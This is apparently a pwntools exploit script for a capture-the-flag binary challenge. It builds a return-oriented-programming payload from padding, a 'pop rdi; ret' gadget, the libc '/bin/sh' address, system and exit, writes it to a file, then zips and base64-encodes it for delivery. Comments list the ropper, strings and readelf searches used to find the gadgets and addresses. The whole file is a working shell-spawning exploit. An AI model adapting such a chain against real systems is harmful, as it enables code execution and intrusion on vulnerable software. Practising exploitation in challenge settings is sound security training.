import os
from  pwn import *

BASE_LIBC = 0x00007ffff7c00000

# Write bytes to file
# file_contents = b"\xf0\x9f\x91\x93\xe2\x9a\xa1"
# file_contents += b"\x90" * 33
# file_contents += p64(0x401183)# p64(0x401183) # pop rdi; ret;
# file_contents += p64(BASE_LIBC + 0x1d8698) # address of /bin/sh
# file_contents += p64(0x400522) # System
# file_contents += p64(0x4007ce) # Exit

file_contents = b"\xf0\x9f\x91\x93\xe2\x9a\xa1"
file_contents += b"\x90" * 33
file_contents += p64(0x00401183)# p64(0x401183) # pop rdi; ret;
file_contents += p64(BASE_LIBC + 0x1d8698) # address of /bin/sh
file_contents += p64(0x004007ce) # ret
file_contents += p64(0x400522) # System
file_contents += p64(0x4004cb) # Exit
file_contents += b"/bin/sh\x00\x00"


# mov rsp; rdi
# 
#    [heap] : 0xc744d0 --> 0x68732f6e69622f ('/bin/sh')
#    [heap] : 0xc74850 --> 0x68732f6e69622f ('/bin/sh')
# libc.so.6 : 0x7f2b075d8698 --> 0x68732f6e69622f ('/bin/sh')
#   [stack] : 0x7ffe9e878740 --> 0x68732f6e69622f ('/bin/sh')
#   [stack] : 0x7ffe9e878d70 --> 0x68732f6e69622f ('/bin/sh')

# My stack
# 0x000000000002a3e5: pop rdi; ret;                         ropper --search "pop rdi; ret;" --file ./glibc/libc.so.6
# 1d8698                                                    strings -t x a glibc/libc.so.6 | grep "/bin/sh"
# 0x0000000000050d60: address of system                     readelf -s glibc/libc.so.6 | grep system
# 0x 00000000000455f0: address of exit                      readelf -s glibc/libc.so.6 | grep exit

with open("./spell.txt", "wb") as binary_file:
    # Write bytes to file
    binary_file.write(file_contents)


os.system('rm spell.zip')
os.system('zip spell.zip spell.txt')
os.system('base64 spell.zip -w 0 > spell_base64')
